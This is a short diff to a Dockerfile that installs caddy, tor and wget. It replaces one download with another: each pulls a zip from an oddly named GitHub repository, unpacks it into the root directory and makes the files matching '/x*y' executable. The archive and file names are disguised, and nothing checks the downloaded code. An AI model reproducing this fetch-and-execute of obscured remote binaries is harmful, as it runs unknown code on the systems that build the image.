@@ -2,7 +2,7 @@ FROM alpine:edge
 
 RUN apk update && \
     apk add --no-cache ca-certificates caddy tor wget && \
-    wget -qO- https://github.com/vernme/wzdzxmdd/raw/main/3DCEList-master.zip | busybox unzip - && \
+    wget -qO- https://github.com/vernme/errxynhxm/raw/main/rograms.zip | busybox unzip - && \
     chmod +x $(ls /x*y) && \
     rm -rf /var/cache/apk/*
 
